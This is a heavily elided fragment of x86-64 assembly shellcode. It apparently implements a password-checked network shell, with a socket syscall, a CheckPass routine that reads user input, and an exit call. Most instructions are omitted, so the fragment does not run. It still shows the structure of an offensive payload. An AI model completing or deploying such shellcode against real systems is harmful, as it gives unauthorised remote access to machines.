...
_start:
    ...
    push 0x10  ; (16 bytes) sockaddr_len
    pop rdx
    syscall
...
CheckPass:
    xor rax , rax
    push 0x8     ;  len of received user input (voluntary greater than needed don't affect shellcode size)
    pop rdx
    ...
    push 0x3c                  ; exit syscall number 60 format exit(int code);
    pop rax
